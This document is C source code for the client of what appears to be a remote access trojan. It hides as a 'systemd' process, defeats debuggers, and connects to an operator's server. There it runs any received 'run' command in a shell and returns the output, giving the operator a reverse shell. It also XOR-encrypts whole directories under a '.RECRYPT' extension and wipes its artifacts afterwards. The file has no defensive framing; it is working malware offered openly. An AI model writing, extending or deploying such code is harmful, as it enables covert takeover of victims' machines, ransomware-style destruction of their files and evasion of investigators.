#include "client_base.h"
#include "postexp.h"
#include "anti_debug.h"
#include "stealth.h"
#include "crypto.h"

#define BUFFER_SIZE 1024
#define RECRYPT_EXTENSION ".RECRYPT"

void execute_command_in_shell(const char *shell_path, const char *command, int sockfd) {
    char output_buffer[BUFFER_SIZE];
    FILE *fp;
    char exec_command[BUFFER_SIZE];

    snprintf(exec_command, sizeof(exec_command), "%s -c \"%s\"", shell_path, command);

    fp = popen(exec_command, "r");
    if (fp == NULL) {
        snprintf(output_buffer, BUFFER_SIZE, "Failed to execute command: %s\n", command);
        send(sockfd, output_buffer, strlen(output_buffer), 0);
        return;
    }

    // Send command output line by line to the server
    while (fgets(output_buffer, sizeof(output_buffer), fp) != NULL) {
        send(sockfd, output_buffer, strlen(output_buffer), 0);
    }

    pclose(fp);

    // Signal end of output to the server
    snprintf(output_buffer, BUFFER_SIZE, "[END_OF_OUTPUT]\n");
    send(sockfd, output_buffer, strlen(output_buffer), 0);
}

int main(int argc, char *argv[]) {
    int sockfd;
    char *server_ip = NULL;
    int server_port = 0;
    char *password = NULL;
    char *encrypt_dir = NULL;
    char *decrypt_dir = NULL;
    char *xor_key = NULL;
    char detected_shell[BUFFER_SIZE];
    char recv_buffer[BUFFER_SIZE];
    int opt;

    // Anti-debugging measures
    anti_debug_ptrace();
    anti_debug_proc();

    // Stealth measures
    rename_process("systemd");
    change_cmdline("systemd");

    // Parse command-line arguments
    while ((opt = getopt(argc, argv, "i:p:w:e:d:k:")) != -1) {
        switch (opt) {
            case 'i':
                server_ip = optarg;
                break;
            case 'p':
                server_port = atoi(optarg);
                break;
            case 'w':
                password = optarg;
                break;
            case 'e':
                encrypt_dir = optarg;
                break;
            case 'd':
                decrypt_dir = optarg;
                break;
            case 'k':
                xor_key = optarg;
                break;
            default:
                print_usage(argv[0]);
                return EXIT_FAILURE;
        }
    }

    // Validate required arguments
    if (!server_ip || server_port <= 0 || !password) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    // Check for encryption or decryption flags
    if (encrypt_dir && decrypt_dir) {
        fprintf(stderr, "Error: Cannot specify both -e (encrypt) and -d (decrypt) simultaneously.\n");
        print_usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if (encrypt_dir) {
        printf("Encrypting files in directory: %s\n", encrypt_dir);
        process_directory(encrypt_dir, xor_key ? xor_key : "default_key", 0); // Encryption mode
        return 0;
    }

    if (decrypt_dir) {
        printf("Decrypting files in directory: %s\n", decrypt_dir);
        process_directory(decrypt_dir, xor_key ? xor_key : "default_key", 1); // Decryption mode
        return 0;
    }

    // Initialize connection
    sockfd = initialize_connection(server_ip, server_port);
    if (sockfd < 0) {
        fprintf(stderr, "Failed to initialize connection.\n");
        return EXIT_FAILURE;
    }

    // Authenticate with the server
    if (!authenticate(sockfd, password)) {
        fprintf(stderr, "Authentication failed.\n");
        close(sockfd);
        return EXIT_FAILURE;
    }

    printf("Authentication successful. Connected to server.\n");

    // Detect available shell
    if (detect_shell(detected_shell, sizeof(detected_shell)) < 0) {
        fprintf(stderr, "No supported shell found. Exiting.\n");
        close(sockfd);
        return EXIT_FAILURE;
    }

    // Notify server about the detected shell
    send(sockfd, detected_shell, strlen(detected_shell), 0);
    printf("Using shell: %s\n", detected_shell);

    // Main loop for receiving commands and sending output
    while (1) {
        ssize_t received = recv(sockfd, recv_buffer, BUFFER_SIZE - 1, 0);
        if (received < 0) {
            perror("Receive failed");
            break;
        } else if (received == 0) {
            printf("Server closed the connection.\n");
            break;
        }

        recv_buffer[received] = '\0';

        // Handle "run <command>" format
        if (strncmp(recv_buffer, "run ", 4) == 0) {
            char *command = recv_buffer + 4;
            printf("Executing command: %s\n", command);
            execute_command_in_shell(detected_shell, command, sockfd);
        } else if (strcmp(recv_buffer, "exit\n") == 0 || strcmp(recv_buffer, "quit\n") == 0) {
            printf("Exiting on server request...\n");
            break;
        }
    }

    // Post-exploitation cleanup
    clean_artifacts();

    // Clean up
    close(sockfd);
    printf("Disconnected from server.\n");
    return 0;
}